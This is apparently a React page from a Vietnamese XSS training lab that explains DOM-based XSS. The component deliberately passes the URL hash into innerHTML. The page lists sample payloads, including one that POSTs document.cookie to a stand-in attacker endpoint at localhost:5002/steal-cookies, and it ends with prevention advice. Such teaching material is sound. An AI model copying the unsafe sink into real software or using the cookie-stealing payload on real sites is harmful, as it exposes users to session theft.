import React, { useEffect } from 'react';
import { Card, Typography, Alert, Divider } from 'antd';
import MainLayout from '../components/Layout/MainLayout';

const { Title, Paragraph, Text } = Typography;

const DomXSSPage = () => {
  useEffect(() => {
    // Get the hash from URL (vulnerable to XSS)
    const hash = window.location.hash.substring(1);

    // Unsafe way to insert content (DOM-based XSS vulnerability)
    const container = document.getElementById('xss-container');
    if (container) {
      container.innerHTML = decodeURIComponent(hash);
    }
  }, []);

  return (
    <MainLayout>
      <div className="container mx-auto p-4">
        <Card className="mb-4" title="DOM-based XSS là gì?">
          <Paragraph>
            DOM-based XSS là một loại tấn công mà kẻ tấn công có thể chèn mã JavaScript độc hại vào
            trang web thông qua việc thao tác với DOM .
          </Paragraph>
          <Paragraph>
            Khác với Reflected XSS và Stored XSS, DOM-based XSS không cần phản hồi từ server. Lỗ
            hổng này xảy ra khi JavaScript trên client-side sử dụng dữ liệu không đáng tin cậy để
            thao tác với DOM.
          </Paragraph>
        </Card>

        <Card title="Demo DOM-based XSS" className="mb-4">
          <div className="mb-4">
            <Paragraph>
              Trang này chứa lỗ hổng DOM-based XSS trong việc xử lý hash của URL. Khi bạn thêm
              payload XSS vào phần hash của URL, nó sẽ được chèn trực tiếp vào DOM thông qua{' '}
              <Text code>innerHTML</Text>.
            </Paragraph>
            <div id="xss-container" className="p-4 border rounded bg-gray-50"></div>
          </div>

          <Divider />

          <Title level={4}>3. Cách thực hiện tấn công</Title>
          <Paragraph>
            <Text strong>Cách 1: Sử dụng URL hash</Text>
            <br />
            Thêm payload XSS vào phần hash của URL, ví dụ:
            <br />
            <Text code>
              {window.location.origin +
                '/dom-xss#' +
                encodeURIComponent('<img src="x" onerror="alert(\'XSS\')">')}
            </Text>
          </Paragraph>

          <Paragraph>
            <Text strong>Cách 2: Đánh cắp cookie</Text>
            <br />
            Sử dụng payload sau để gửi cookie đến server của kẻ tấn công:
            <br />
            <Text code>
              {encodeURIComponent(
                "<img src=\"x\" onerror=\"fetch('http://localhost:5002/steal-cookies', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookies: document.cookie, userAgent: navigator.userAgent})})\">"
              )}
            </Text>
          </Paragraph>
        </Card>

        <Card className="mb-4">
          <Title level={4}>4. Các payload XSS mẫu</Title>
          <ul>
            <li>
              <Text code>{'<img src="x" onerror="alert(\'Attacker DOM-based XSS\')">'}</Text> - Sử
              dụng onerror
            </li>
            <li>
              <Text code>{'<svg onload="alert(\'Attacker DOM-based XSS\')">'}</Text> - Sử dụng SVG
            </li>
            <li>
              <Text code>{'<iframe onload="alert(\'Attacker DOM-based XSS\')">'}</Text> - Sử dụng
              iframe
            </li>
            <li>
              <Text code>
                {'<a href="javascript:alert(\'Attacker DOM-based XSS\')">Click me</a>'}
              </Text>
              - Sử dụng javascript: protocol
            </li>
          </ul>
        </Card>

        <Card>
          <Title level={4}>5. Cách phòng chống</Title>
          <Paragraph>
            <ul>
              <li>
                Không sử dụng <Text code>innerHTML</Text> với dữ liệu không đáng tin cậy
              </li>
              <li>
                Sử dụng <Text code>textContent</Text> hoặc <Text code>innerText</Text> thay thế
              </li>
              <li>Sanitize dữ liệu trước khi chèn vào DOM</li>
              <li>Sử dụng Content Security Policy (CSP)</li>
              <li>Validate và encode dữ liệu đầu vào</li>
              <li>Sử dụng thư viện sanitize như DOMPurify</li>
            </ul>
          </Paragraph>
        </Card>
      </div>
    </MainLayout>
  );
};

export default DomXSSPage;
